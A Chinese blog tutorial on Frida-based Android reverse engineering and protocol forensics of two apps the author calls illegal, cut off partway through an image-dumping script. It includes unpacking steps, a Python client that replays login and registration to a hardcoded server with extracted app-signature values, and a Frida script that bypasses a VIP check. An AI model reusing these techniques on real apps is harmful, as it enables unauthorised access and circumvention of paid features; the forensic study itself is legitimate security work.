    <content type="html"><![CDATA[<h1 id="Frida逆向与协议分析-2"><a href="#Frida逆向与协议分析-2" class="headerlink" title="Frida逆向与协议分析-2"></a>Frida逆向与协议分析-2</h1><p>&emsp;frida逆向与协议分析第二部分。</p><span id="more"></span><h2 id="0x03-Frida逆向之违法App协议分析与取证实战"><a href="#0x03-Frida逆向之违法App协议分析与取证实战" class="headerlink" title="0x03 Frida逆向之违法App协议分析与取证实战"></a>0x03 Frida逆向之违法App协议分析与取证实战</h2><p>&emsp;之前介绍了frida定位关键类的两种方式：基于trace（objection、Zentracer）、基于内存（Java.choose寻找实例）。本章以两个违法样本为例，对app关键协议进行分析，从而巩固之前的知识。</p><h3 id="加固app协议分析"><a href="#加固app协议分析" class="headerlink" title="加固app协议分析"></a>加固app协议分析</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>&emsp;抓包往往可以<strong>快速定位关键接口函数的位置</strong>。</p><p>&emsp;抓包原理：在手机上设置代理，将手机流量数据转发到计算机的代理软件后再完成上网，这样就可以再计算机上监听手机上的流量数据。由于中间人抓包无法应对app使用Https等加密协议进行通信的情况，因此需要<strong>将代理软件的证书导入手机系统并添加到证书信任列表中</strong>。如果app不信任用户添加到系统中的证书，那么需要<strong>将证书从用户信任去移动到系统信任列表中</strong>。</p><p>&emsp;代理方式有两种：</p><p>（1）wifi代理（应用层），如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231009213402929.png" alt="image-20231009213402929" style="zoom:67%;" /></p><p>&emsp;这种方式有两个弊端：（a）无法处理非http通信，例如websocket。（b）容易被app检测到，相关代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(&quot;http.proxyHost&quot;)</span><br></pre></td></tr></table></figure><p>（2）vpn代理（更加推荐），相当于虚拟新网卡并修改手机路由表，工具为postern（注意要匹配所有地址）。</p><p><img src="/images/frida-reverse-analysis-2/image-20231009230301580.png" alt="image-20231009230301580" style="zoom:67%;" /></p><p>&emsp;linux中间人中安装charles，并设置代理：</p><p><img src="/images/frida-reverse-analysis-2/image-20231009231938941.png" alt="image-20231009231938941" style="zoom:67%;" /></p><p>&emsp;movetv.apk的登陆界面抓包如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231009234020487.png" alt="image-20231009234020487" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231009234104412.png" alt="image-20231009234104412" style="zoom:67%;" /></p><h4 id="注册-登录协议分析"><a href="#注册-登录协议分析" class="headerlink" title="注册/登录协议分析"></a>注册/登录协议分析</h4><p>&emsp;通过抓包分析，name与pass分别代表用户名与密码，而login始终为”login”。而key、rightkey、memi1等字段暂时还不确定。</p><p>&emsp;要对这些字段进行分析，需要<code>找到字段形成的地方</code>。除了<strong>静态工具分析</strong>外，推荐使用前面介绍的快速定位关键类的方式，即<code>基于内存枚举的关键类定位方案</code>，以确定字段形成的位置。</p><p>&emsp;在此，基于用户登录一定要单击<code>登录</code>按钮的特性，而按钮button属于view的继承类，因此可以通过hook view类的onClick函数快速得到当前控件的onClick函数所在的类，如下hookEvent.js所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jclazz = <span class="literal">null</span></span><br><span class="line"><span class="keyword">var</span> jobj = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getObjClassName</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!jclazz)&#123;</span><br><span class="line">        <span class="keyword">var</span> jclazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Class&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!jobj)&#123;</span><br><span class="line">        <span class="keyword">var</span> jobj = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jclazz.<span class="property">getName</span>.<span class="title function_">call</span>(jobj.<span class="property">getClass</span>.<span class="title function_">call</span>(obj))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">watch</span>(<span class="params">obj, mtdName</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> listener_name = <span class="title function_">getObjClassName</span>(obj)</span><br><span class="line">    <span class="keyword">var</span> target = <span class="title class_">Java</span>.<span class="title function_">use</span>(listener_name)</span><br><span class="line">    <span class="comment">// target should have onClick method</span></span><br><span class="line">    <span class="keyword">if</span>(!target || !mtdName <span class="keyword">in</span> target)&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    target[mtdName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[WatchEvent] &quot;</span> + mtdName + <span class="string">&quot;: &quot;</span> + <span class="title function_">getObjClassName</span>(<span class="variable language_">this</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>[mtdName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OnClickListener</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// start in spawn mode</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.view.View&quot;</span>).<span class="property">setOnClickListener</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">listener</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(listener != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="title function_">watch</span>(listener, <span class="string">&#x27;onClick&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setOnClickListener</span>(listener)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// start in attach mode</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.view.View$ListenerInfo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                instance = instance.<span class="property">mOnClickListener</span>.<span class="property">value</span></span><br><span class="line">                <span class="keyword">if</span>(instance)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mOnClickListener : &quot;</span> + <span class="title function_">getObjClassName</span>(instance))</span><br><span class="line">                    <span class="title function_">watch</span>(instance, <span class="string">&#x27;onClick&#x27;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">OnClickListener</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 注入到前台 app 中</span><br><span class="line">frida -U -F -l hookEvent.js</span><br></pre></td></tr></table></figure><p>&emsp;结果为：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010110906554.png" alt="image-20231010110906554" style="zoom:67%;" /></p><p>&emsp;因此，找到字段形成的地方为<code>com.cz.babySister.activity.LoginActivity</code>。</p><p>&emsp;之后，要得到此类具体的代码，可以通过静态反编译工具进行。发现进行<a href="https://www.isisy.com/1420.html">加壳处理</a>：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010112211340.png" alt="image-20231010112211340" style="zoom:67%;" /></p><p>&emsp;可以利用脱壳工具进行脱壳，例如一代<code>frida_dexdump</code>，二代抽取脱壳<code>frida_fart|FART</code>等。在此使用frida_dexdump，流程见<a href="https://github.com/hluwa/frida-dexdump">链接</a>。脱壳出5个dex，在dex3中找到：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010115547318.png" alt="image-20231010115547318" style="zoom:67%;" /></p><p>&emsp;其中，猜测b()函数应该是提交用户名与密码到服务器的函数。使用objection对b()函数进行注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.cz.babySister explore</span><br><span class="line">android hooking watch class_method com.cz.babySister.activity.LoginActivity.b --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010120458729.png" alt="image-20231010120458729" style="zoom:80%;" /></p><p>&emsp;因此确定b()传递用户名与密码。在用静态分析跟踪实现，最终确认到了q()函数，但是跟进后发现全为nop，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010125607830.png" alt="image-20231010125607830" style="zoom:67%;" /></p><p>&emsp;经过查询资料，发现是<a href="https://blog.csdn.net/zhangmiaoping23/article/details/52160473">二代抽取加固</a>，使用frida_fart，按照<a href="https://blog.51cto.com/u_15101562/2622401">链接</a>进行脱壳（注意到对movetv.apk设置读取sd卡的权限）。经历千辛万苦，终于找到了正常的逻辑：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010152911816.png" alt="image-20231010152911816" style="zoom:67%;" /></p><p>&emsp;依次跟进v5（key）、v6（rightkey）、v4（memi1）的实现逻辑，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010153119863.png" alt="image-20231010153119863" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231010153237044.png" alt="image-20231010153237044" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231010153542277.png" alt="image-20231010153542277" style="zoom:67%;" /></p><p>&emsp;审计上述代码，发现：v5（key）实际上是app的签名，v6（rightkey）是app所安装的包的证书部分，v4（memi1）是android_id。这些值都是固定值，因此，无需借助app，只需要输入正确的用户名与密码，再传入固定的key、rightkey、memi1即可。</p><p>&emsp;app注册的逻辑与登陆类似。最终可以<strong>用python实现脱机注册与登录</strong>，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># invoke.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tv</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.root = <span class="string">&quot;http://39.108.64.125/WebRoot/superMaster/Server&quot;</span></span><br><span class="line">        self.memi1 = <span class="string">&quot;34463b7d13ee6ad9&quot;</span></span><br><span class="line">        self.rightkey = <span class="string">&quot;376035775&quot;</span></span><br><span class="line">        self.key = <span class="string">&quot;308202d5308201bda00302010202041669d9bf300d06092a864886f70d01010b0500301b310b3009060355040613023836310c300a06035504031303776569301e170d3136303731383038313935395a170d3431303731323038313935395a301b310b3009060355040613023836310c300a0603550403130377656930820122300d06092a864886f70d01010105000382010f003082010a028201010095f85892400aae03ca4ed9dcd838d162290ae8dd51939aac6ecfde8282f207c4cd9e507929a279e0a36f1e4847330cb53908c92915b2c6a93d7064be452d073a472093f7ca14f4ab68f827582fe0988e9e4bc8a6ea3b56001cbbbb760f9eec571b0bbc97392e65aaf08c686f0e2ba353896d48a37c36716239977bd0e4dd878025cab497d8164537aec9f6599eefb98577dce972a1b794e211226520e23497beec3fd8548bb5b4d263120d40115cca28116bac32378df5033f536a0d7367fef78c587fefed28c5c9b35ba684ed6e46d9369c40950cf7ad7236d10b7a51dfd2a8f218db72323bbd19f46947410b1191f263012ad4ba8f749223e37591254ee7f50203010001a321301f301d0603551d0e041604143d43284bd5e4b0d322c9962a5b70aad4dcbc3634300d06092a864886f70d01010b050003820101000f04c51ff763311aa011777ba2842b441b15c316373d1e1ed4116cf86e29d55c6ed3fa4c475251b1fb4fac57195dbca0166ebe565d9834552a3758b97c4528bab1f7ab82bb3a9faa932f5bc10943f3daf52e0fe5889ffb58a6be67ea1c9a2fb37dc8aa6f3af476039a467336991a4e52dccd520195cd473eb5b984e702ed9ff638a14c3abb575a7a80ae4062084d1138a06a20e173be9df32df631311b07352898706198ddebaaa011f0da8e5f288f7cfb77505bc943f6476d6cc1feef56b68137aad91f23c4bb772169539d05653a6f0d75f7192164e822b934322f3a975df677903b1667f5dc1e9ddb185da3281d31bfb8f67a84bd23bbcb398f8bb637dd72&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, data=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            data = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> requests.post(url = self.root, data = data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self, name, pw</span>):</span><br><span class="line">        ret = self.post(&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:name, </span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:pw,</span><br><span class="line">            <span class="string">&quot;memi1&quot;</span>:self.memi1,</span><br><span class="line">            <span class="string">&quot;key&quot;</span>:self.key,</span><br><span class="line">            <span class="string">&quot;rightkey&quot;</span>:self.rightkey,</span><br><span class="line">            <span class="string">&quot;register&quot;</span>:<span class="string">&quot;register&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;register: &quot;</span>, ret.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self, name, pw</span>):</span><br><span class="line">        ret = self.post(&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:name, </span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:pw,</span><br><span class="line">            <span class="string">&quot;memi1&quot;</span>:self.memi1,</span><br><span class="line">            <span class="string">&quot;key&quot;</span>:self.key,</span><br><span class="line">            <span class="string">&quot;rightkey&quot;</span>:self.rightkey,</span><br><span class="line">            <span class="string">&quot;login&quot;</span>:<span class="string">&quot;login&quot;</span></span><br><span class="line">        &#125;)       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login: &quot;</span>, ret.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tv = tv()</span><br><span class="line">    <span class="comment"># register</span></span><br><span class="line">    <span class="built_in">print</span>(tv.register(<span class="string">&quot;wd2711&quot;</span>, <span class="string">&quot;1111&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login</span></span><br><span class="line">    <span class="built_in">print</span>(tv.login(<span class="string">&quot;wd2711&quot;</span>, <span class="string">&quot;1111&quot;</span>))</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010155627948.png" alt="image-20231010155627948" style="zoom:67%;" /></p><h3 id="违法应用取证分析与vip破解"><a href="#违法应用取证分析与vip破解" class="headerlink" title="违法应用取证分析与vip破解"></a>违法应用取证分析与vip破解</h3><p>&emsp;安装fulao2.apk。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install fulao2.apk</span><br></pre></td></tr></table></figure><h4 id="vip清晰度破解"><a href="#vip清晰度破解" class="headerlink" title="vip清晰度破解"></a>vip清晰度破解</h4><p>&emsp;手机app对应的服务器好像寄了，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010163343163.png" alt="image-20231010163343163" style="zoom:67%;" /></p><p>&emsp;ok，那抓不了包了，日了。那直接定位关键类，由于书中写了，清晰度切换是一个按钮控件，这需要vip。因此，我们只需要使用之前抓取按钮的脚本hookEvent.js即可。但是由于我们进不去页面呀（hookEvent.js，此时清晰度控件应该还未加载），只能抓取到：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010164845820.png" alt="image-20231010164845820" style="zoom:67%;" /></p><p>&emsp;正常的话，应该抓取到<code>com.ilulutv.fulao2.film.l$t</code>。</p><p>&emsp;且验证此apk未加壳（PKID不准，movetv.apk放进去也显示这个）：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010165814405.png" alt="image-20231010165814405" style="zoom:67%;" /></p><p>&emsp;定位到<code>com.ilulutv.fulao2.film.l$t</code>这个类，如下所示，可以看到是一个判断语句。</p><p><img src="/images/frida-reverse-analysis-2/image-20231010170758627.png" alt="image-20231010170758627" style="zoom:67%;" /></p><p>&emsp;之后分析各个判断语句之后执行的操作：</p><p>（1）<code>this.d.i</code>：生成一个对话框，其中要求升级vip。</p><p><img src="/images/frida-reverse-analysis-2/image-20231010172852843.png" alt="image-20231010172852843" style="zoom:67%;" /></p><p>（2）…</p><p>&emsp;那么，如果将<code>l.d(this.d)</code>的值设置为true即可。由于此app已无法正常访问，因此以书中为准。使用frida脚本在内存中修改<code>l.d(this.d)</code>的值。<code>l.d</code>的实现如下，其中arg0为l类型：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010173538290.png" alt="image-20231010173538290" style="zoom:67%;" /></p><p>&emsp;脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookq0.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookq0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ilulutv.fulao2.film.l&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance =&gt;&quot;</span>, instance)</span><br><span class="line">                instance.<span class="property">q0</span>.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;completed&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;最终调用成功了，可惜我这无法验证，呜呜。</p><h4 id="图片取证分析"><a href="#图片取证分析" class="headerlink" title="图片取证分析"></a>图片取证分析</h4><p>&emsp;之后分析app协议内容。协议分析的第一步：<code>针对样本流量的抓取与关键字段的定位</code>。</p><p>&emsp;本次抓包不使用之前的<code>中间人抓包（charles|postern）</code>，而是使用hook抓包，其优势在于：<code>（1）抓取的流量更加专一，不会受到手机上其他app流量的影响；（2）可以避免app本身对抗抓包的姿势，例如服务器校验客户端，SSL Pinning等</code>。但是，如果app有对抗frida等工具的手段，那么就需要bypass。<code>（3）hook可以打印调用栈，因此可确定函数之前经过的所有函数。</code></p><p>&emsp;hook抓包的效果取决于找到的hook点。（1）android有很多封装网络通信的库，例如okhttp3、retrofit。因此，可能需要针对不同的库设置hook点。（2）对于通信协议而言，只抓取http的hook点也不够全面。之后装逼时刻，r0ysue开发了r0capture，<code>hook系统中在socket层发送和接收数据包的关键函数，基本上能抓所有流量</code>。</p><p>&emsp;虽然跑不了，但是分析一波<a href="https://github.com/r0ysue/r0capture">r0capture</a>，此书中利用r0capture抓取了图片（挖个坑）。抓取后的图片是加密的。那之后，就要找到图片解密的点。<code>图片要加载的时候，此时图片就被解密</code>。</p><p>&emsp;android中加载图片的过程：使用BitmapFactory类中的函数加载bitmap，最终通过ImageView加载Bitmap类型的图片。</p><p>&emsp;为了验证这个过程，使用objection插件wallbreaker在内存中搜索Bitmap对象，手动触发图片的加载后再次搜索Bitmap对象，前后数量不一致，因此可以确定此app使用Bitmap对象来保存图片。</p><p>&emsp;android开发中，BitmapFactory中有4个静态方法：<code>decodeFile、decodeResource、decodeStream、decodeByteArray</code>，分别用于从<code>文件系统、资源、输入流、字节数组</code>中加载出Bitmap对象。更暴力一点，对BitmapFactory中所有函数进行hook，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class android.graphics.BitmapFactory </span><br></pre></td></tr></table></figure><p>&emsp;最终发现是使用<code>decodeByteArray</code>函数（static），此函数的第1个参数就是原始图片的字节信息。为了确认此图片信息为明文，使用frida脚本获取参数并保存。saveBitmap.js代码如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generate random string as image name</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">guid</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx&quot;</span>.<span class="title function_">replace</span>(<span class="regexp">/[xy]/g</span>, <span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">        <span class="comment">// generate r in [0:1:15]</span></span><br><span class="line">        <span class="keyword">var</span> r = <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">16</span> | <span class="number">0</span></span><br><span class="line">        <span class="keyword">var</span> v = c == <span class="string">&quot;x&quot;</span> ? r : (r&amp;<span class="number">0x3</span>|<span class="number">0x8</span>)</span><br><span class="line">        <span class="keyword">return</span> v.<span class="title function_">toString</span>(<span class="number">16</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook decodeByteArray</span></span><br><span class="line"><span class="comment">// decodeByteArray(byte[] data, int offset, int length, Options opts)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveBitmap_1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BitmapFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.BitmapFactory&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> decodeByteArray_func = decodeByteArray.<span class="title function_">overload</span>(<span class="string">&quot;[B&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;android.graphics.BitmapFactory$Options&quot;</span>)</span><br><span class="line">        decodeByteArray_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">data, offset, length, opts</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeByteArray</span>(data, offset, length, opts)</span><br><span class="line">            <span class="keyword">var</span> path = <span class="string">&quot;/sdcard/Download/tmp&quot;</span> + <span class="title function_">guid</span>() + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;path =&gt;&quot;</span>, path)</span><br><span class="line">            <span class="keyword">var</span> f = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(path)</span><br><span class="line">            <span class="keyword">var</span> fos = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(f)</span><br><span class="line">            fos.<span class="title function_">write</span>(data)</span><br><span class="line">            fos.<span class="title function_">close</span>()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(saveBitmap_1)</span><br></pre></td></tr></table></figure><p>&emsp;之后，对上述脚本中的saveBitmap_1进行修改，以适应最后的rpc操作：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookBitmap.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveBitmap_1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BitmapFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.BitmapFactory&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> decodeByteArray_func = <span class="title class_">BitmapFactory</span>.<span class="property">decodeByteArray</span>.<span class="title function_">overload</span>(<span class="string">&quot;[B&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;android.graphics.BitmapFactory$Options&quot;</span>)</span><br><span class="line">        decodeByteArray_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">data, offset, length, opts</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeByteArray</span>(data, offset, length, opts)</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            var path = &quot;/sdcard/Download/tmp&quot; + guid() + &quot;.jpg&quot;</span></span><br><span class="line"><span class="comment">            console.log(&quot;path =&gt;&quot;, 